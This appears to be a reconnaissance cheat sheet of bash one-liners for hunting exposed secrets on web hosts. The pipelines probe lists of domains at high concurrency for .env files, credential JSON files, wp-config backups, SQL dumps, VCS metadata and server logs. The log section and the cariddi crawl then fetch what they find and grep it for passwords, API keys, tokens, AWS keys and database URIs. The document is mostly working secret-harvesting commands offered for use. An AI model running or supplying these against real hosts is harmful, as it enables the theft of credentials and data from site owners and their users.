# Sensitive Files & Secret Leakage

> Hunt for exposed configuration files, backups, and sensitive data

## Config & Secret File Probing

```bash
cat alive-domains.txt | sed -E 's#^https?://([^:/]+).*#\1#' | sort -u | while read host; do
    [ -z "$host" ] && continue
    for path in /config.js /config.json /app/config.js /settings.json /database.json /firebase.json /.env /.env.production /.env.local /.env.example /.env.bak /.env.backup /api-keys.json /credentials.json /secret.json /google-services.json /package.json /package-lock.json /composer.json /po.xml /docker-compose.yml /manifest.json /service-worker.js /config.yml /config.yaml /config.xml /config.php /web.config /config.bak /config.example /config/secrets.json /config/keys.json /_wpeprivate/config.json /.git/config; do
        echo "http://${host}${path}"
        echo "https://${host}${path}"
    done
done | httpx -mc 200,301,302,403 -cl -silent -retries 2 -threads 100 \
| awk '$2 != 0 && $2 != 986 { print $1 }' \
| tee results.txt
```

## Comprehensive Sensitive File Discovery

```bash
cat alive-domains.txt | sed 's|http://||;s|https://||;s|:80||;s|:443||' | sort -u | while read host; do
    [ -z "$host" ] && continue
    for path in /.env /.env.production /.env.local /.env.example /.env.bak /.env.backup /.env.test /.env.staging /.env.development /.env.old /.env.save /.env.tmp /config.json /config.php /web.config /api-keys.json /credentials.json /secret.json /secrets.json /database.json /firebase.json /google-services.json /config.yaml /config.yml /appsettings.json /configuration.json /settings.json /wp-config.php /config.inc.php /db.config /database.yml /config/database.yml /backup.sql /dump.sql /backup.zip /dump.tar /backup.rar /dump.rar /.git/config /.svn/entries /CVS/Entries /_wpeprivate/config.json /admin/config.json /api/config.json /app/config.json /src/config.json /includes/config.php /inc/config.php /system/config.php /application/config.php /app/config/database.json /app/config/secrets.json; do
        echo "http://${host}${path}"
        echo "https://${host}${path}"
    done
done | httpx -mc 200,301,302,403 -cl -retries 2 -threads 100 -silent \
| awk '$2 != 0 && $2 != 986 { print $1 }' > leaks.txt
```

## Targeted Sensitive File Checks

```bash
cat crawledurls.txt | httpx -silent -threads 100 -path /.env,/config.php,/wp-config.php.bak,/.htaccess,/server-status -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew sensitive.txt
```

## Source Code & VCS Exposure

```bash
cat crawledurls.txt | httpx -silent -threads 100 -path /.svn/entries,/.bzr/README,/CVS/Root -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew vcs-exposed.txt
```

## Database Files

```bash
cat crawledurls.txt | httpx -silent -threads 100 -path /database.sql,/db.sql,/backup.sql,/dump.sql -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew db-files.txt
```

## Log Files & Debug Leakage

```bash
while read host; do
  echo "$host/app.log"
  echo "$host/error.log"
  echo "$host/access.log"
  echo "$host/debug.log"
  echo "$host/laravel.log"
  echo "$host/logs/error.log"
  echo "$host/logs/access.log"
  echo "$host/logs/production.log"
  echo "$host/logs/development.log"
  echo "$host/nginx/error.log"
  echo "$host/nginx/access.log"
  echo "$host/php_errors.log"
  echo "$host/php_error.log"
  echo "$host/wp-content/debug.log"
  echo "$host/backup/error.log"
  echo "$host/tmp/error.log"
  echo "$host/rails/log/production.log"
  echo "$host/rails/log/development.log"
  echo "$host/mail.log"
  echo "$host/auth.log"
  echo "$host/apache/error.log"
  echo "$host/apache/access.log"
  echo "$host/iis/logs/error.log"
  echo "$host/docker/logs/app.log"
  echo "$host/k8s/logs/pod.log"
  echo "$host/error.log.bak"
  echo "$host/logs/error.log.old"
  echo "$host/var/log/apache2/error.log"
done < https-subs.txt | sort -u \
| httpx -mc 200 -cl -fr -rl 100 -threads 50 -silent \
| awk '$2 != 0 && $2 != 986 { print $1 }' \
| xargs -I{} sh -c 'curl -s {} | grep -Ei "password|api_key|apikey|secret|token|ssh|private key|error|exception|database|connection|user|email|credential|failure|unauthorized|warning|info|critical|fatal|aws_access|jwt|bearer|stacktrace|traceback|db_pass|mongo_uri" && echo "==== {} ===="' \
| tee log-leaks.txt
```

## Cariddi Full Crawl with Secret Detection

```bash
cariddi -u https://target.com -d 5 -s -e -ext 1 -plain -t 50 -c 20 | tee cariddi-results.txt && grep -E "(api|secret|key|token|pass|auth)" cariddi-results.txt | anew secrets-found.txt
```

